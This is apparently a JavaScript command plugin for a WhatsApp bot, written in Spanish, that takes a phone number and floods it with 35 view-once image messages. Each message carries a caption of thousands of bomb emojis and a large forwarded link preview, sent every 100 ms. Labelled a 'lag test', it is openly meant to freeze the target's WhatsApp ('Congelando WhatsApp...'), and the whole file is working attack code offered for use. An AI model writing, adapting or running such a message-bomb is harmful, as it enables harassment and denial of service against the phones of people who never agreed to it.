import fetch from 'node-fetch';

let handler = async (m, { conn, args, usedPrefix, command }) => {
  let number = args[0];

  if (!number || !number.match(/^\d{5,}$/)) {
    return m.reply(`✳️ *Formato incorrecto*\n\n📌 Usa: *${usedPrefix + command} 573001234567*`);
  }

  let jid = number + "@s.whatsapp.net";
  let times = 35; // más mensajes = más lag

  m.reply(`📡 *Lag Test a:* ${jid}\n🧨 *Cargando... (${times} viewOnce pesados)*`);

  // Descargar imagen como buffer
  let res = await fetch("https://telegra.ph/file/94cf0cb2054ff45e3f0df.jpg");
  let buffer = await res.buffer();

  // Texto extremadamente largo con emojis
  let spamText = '🧨'.repeat(3000) + '\n'.repeat(50) + '🧨'.repeat(3000);

  for (let i = 0; i < times; i++) {
    try {
      await conn.sendMessage(jid, {
        image: buffer,
        caption: spamText,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: ['0@s.whatsapp.net'],
          externalAdReply: {
            title: "⚠️ Lag Test Activo",
            body: "Congelando WhatsApp...",
            thumbnail: buffer,
            sourceUrl: "https://whatsapp.com",
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      });
      await new Promise(res => setTimeout(res, 100));
    } catch (e) {
      console.error(`❌ Error en mensaje ${i + 1}:`, e);
    }
  }

  m.reply("✅ *Lag Test finalizado.* Si no se congeló, ese WhatsApp es God.");
};

handler.command = /^lag$/i;
handler.owner = true;
export default handler;